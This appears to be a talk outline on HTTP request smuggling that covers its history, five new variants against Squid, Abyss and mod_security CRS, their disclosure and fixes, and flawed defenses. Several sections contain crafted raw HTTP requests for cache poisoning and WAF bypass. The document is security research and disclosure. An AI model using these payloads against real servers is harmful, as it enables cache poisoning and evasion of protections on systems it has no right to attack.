# HTTP Request Smuggling in 2020

## About the Author
- **Amit Klein**
- **VP of Security Research at SafeBreach (2015-Present)**
- **Over 29 years of experience in Information Security**
- **Author of 30+ research papers and numerous advisories on high-profile products**
- **Presented at major security conferences including BlackHat (3 times), DefCon (twice), Usenix, NDSS, HITB, InfoCom, DSN, RSA, CertConf, Bluehat, OWASP Global (keynote), OWASP EU, and AusCERT (keynote)**

- **Website: [http://www.securitygalore.com](http://www.securitygalore.com)**

## Introduction
### What is HTTP Request Smuggling?
HTTP Request Smuggling is an attack that exploits differences in how different entities (e.g., proxies, firewalls, and web servers) interpret HTTP requests. This can lead to a desynchronization, allowing attackers to smuggle malicious requests.

#### Actors
- **Attacker (client)**
- **Proxy/Firewall**
- **Web Server (or another proxy/firewall)**

#### Attack Scenario
1. The attacker sends a specially crafted request to the proxy.
2. The proxy interprets the request differently from the web server.
3. This difference allows the attacker to inject or manipulate requests.

Example:
- **Attacker's Request:**
  ```http
  POST /hello.php HTTP/1.1
  ...
  Content-Length: 0
  Content-Length: 44
  GET /poison.html HTTP/1.1
  Host: www.example.com
  Something: GET /target.html HTTP/1.1
  ```

- **Caching Proxy (last Content-Length):**
  1. `/hello.php` (44 bytes in body)
  2. `/target.html`

- **Web Server (first Content-Length):**
  1. `/hello.php` (0 bytes in body)
  2. `/poison.html` (+headers)

### A Short History
- **2005**: The seminal paper "HTTP Request Smuggling" is published.
- **2005-2006**: Some short research pieces on detecting and preventing HTTP Request Smuggling.
- **2007-2015**: Limited activity.
- **2015-2016**: Regis “Regilero” Leroy presents "Hiding Wookies in HTTP" at DefCon 24.
- **2019**: James Kettle presents "HTTP Desync Attacks" at BlackHat US and EU.

### Is HTTP Request Smuggling Still Relevant?
- **2020 Update**: Basic attacks have been known since 2005.
- **Recent Resurgence**: Thanks to James Kettle and Regis “Regilero” Leroy, the topic has regained attention.
- **Vulnerability Scope**: IIS, Apache, nginx, node.js, Abyss, Tomcat, Varnish, lighttpd, Squid, Caddy, Traefik, HAproxy.
- **Expectations**: Despite the age of the attack, many mainstream web/proxy servers are still vulnerable.

## Part 1: New Variants
### Variant 1: Header SP/CR Junk
- **Example:**
  ```http
  Content-Length abcde: 20
  ```
- **Behavior**:
  - **Squid**: Ignores this header.
  - **Abyss X1**: Converts "Header SP/CR junk" into "Header".
- **Attack**:
  - **Cache Poisoning (Squid in front of Abyss):**
    ```http
    POST /hello.php HTTP/1.1
    Host: www.example.com
    Connection: Keep-Alive
    Content-Length: 41
    Content-Length abcde: 3
    barGET /poison.html HTTP/1.1
    Something: GET /welcome.html HTTP/1.1
    Host: www.example.com
    ```

### Variant 2: Wait for It
- **Variant 1 relies on Abyss’s use of the last Content-Length header.**
- **Partial Request (incomplete body)**: Abyss waits for 30 seconds, then invokes the backend script, discarding the remaining body.
- **Attack**:
  - **Cache Poisoning (Squid in front of Abyss):**
    ```http
    POST /hello.php HTTP/1.1
    Host: www.example.com
    Connection: Keep-Alive
    Content-Length abcde: 39
    GET /welcome.html HTTP/1.1
    Something: GET /poison.html HTTP/1.1
    Host: www.example.com
    ```

### Variant 3: HTTP/1.2 to Bypass CRS
- **mod_security + CRS**: Free, open-source WAF with rudimentary protection against HTTP Request Smuggling.
- **Default Paranoia Level**: 1.
- **Bypass**: Works for paranoia levels ≤ 2.
- **Better Defense**: Levels 3/4, but with false positives.
- **Workarounds**:
  - **Rule 921130**: Use HTTP/1.2.
  - **Rule 921150**: Work around CR/LF in argument names.
- **Example**:
  ```http
  POST /hello.php HTTP/1.1
  ...
  Content-Length: 65
  Content-Length abcde: 3
  barGET http://www.example.com/poison.html?= HTTP/1.2
  Something: GET /welcome.html HTTP/1.1
  ```

### Variant 4: A Plain Solution
- **CRS Paranoia Level ≤ 2**: Does not check the body of requests with `Content-Type: text/plain`.
- **Example**:
  ```http
  POST /hello.php HTTP/1.1
  Host: www.example.com
  User-Agent: foo
  Accept: */*
  Connection: Keep-Alive
  Content-Type: text/plain
  Content-Length: 41
  Content-Length Kuku: 3
  barGET /poison.html HTTP/1.1
  Something: GET /welcome.html HTTP/1.1
  Host: www.example.com
  User-Agent: foo
  Accept: */*
  ```

### Variant 5: CR Header
- **First Successful Report?**: Listed in Burp’s HTTP Request Smuggling module as "0dwrap".
- **Behavior**:
  - **Squid**: Ignores this header.
  - **Abyss**: Respects this header.
- **Example (Squid in front of Abyss, using "wait for it")**:
  ```http
  POST /hello.php HTTP/1.1
  Host: www.example.com
  Connection: Keep-Alive
  [CR]Content-Length: 39
  GET /welcome.html HTTP/1.1
  Something: GET /poison.html HTTP/1.1
  Host: www.example.com
  ```

### Overriding Existing Cache Items
- **Use `Cache-Control: no-cache`** in the request for the target page.
- **Example**:
  ```http
  POST /hello.php HTTP/1.1
  Host: www.example.com
  Connection: Keep-Alive
  Cache-Control: no-cache
  Content-Length: 41
  Content-Length Kuku: 3
  barGET /poison.html HTTP/1.1
  Something: GET /welcome.html HTTP/1.1
  Host: www.example.com
  ```

### Demo
- **Smuggling Demo Script**: [https://github.com/SafeBreach-Labs/HRS](https://github.com/SafeBreach-Labs/HRS)

### Status
- **Variant 1**: Reported to Squid, Abyss (fixed in v2.14).
- **Variant 2**: Reported to Abyss (fixed in v2.14).
- **Variant 3**: Reported to OWASP CRS. Fixed in CRS 3.3.0-RC2 (pull 1770).
- **Variant 4**: Reported to OWASP CRS. Fixed in CRS 3.3.0-RC2 (pull 1771).
- **Variant 5**: Reported to Squid, Abyss (fixed in v2.14).

- **CVE-2020-15810**: Assigned by Squid Team for Variants 1 and 5. Suggested workaround:
  ```config
  relaxed_header_parser=off
  ```
- **Fix Expected**: August 3rd (Squid security advisory SQUID-2020:10).

## Part 2: New Defenses
### Flawed Approach #1: Normalization of Outbound HTTP Headers
- **Pros**: Good for HTTP devices behind the proxy.
- **Cons**: Not effective for attacks between the proxy and devices in front of it.
- **Scenario**: Client → P1 → P2 → WS
  - **P1 uses the first Content-Length, P2 uses the last Content-Length**.
  - **HTTP Request Smuggling can occur between P1 and P2**.

### Flawed Approach #2: One New TCP Connection per Outbound Request
- **Pros**: Good for HTTP devices behind the proxy.
- **Cons**: Not effective for attacks between the proxy and devices in front of it.
- **Same as previous scenario**.

### mod_security + CRS
- **Pros**:
  - True WAF.
  - Free and open-source.
- **Cons**:
  - Only supports IIS, Apache, nginx.
  - Rudimentary defense against HTTP Request Smuggling.
- **Conclusion**: Not sufficient for all use cases.

This document provides a comprehensive overview of HTTP Request Smuggling, its history, new variants, and potential defenses.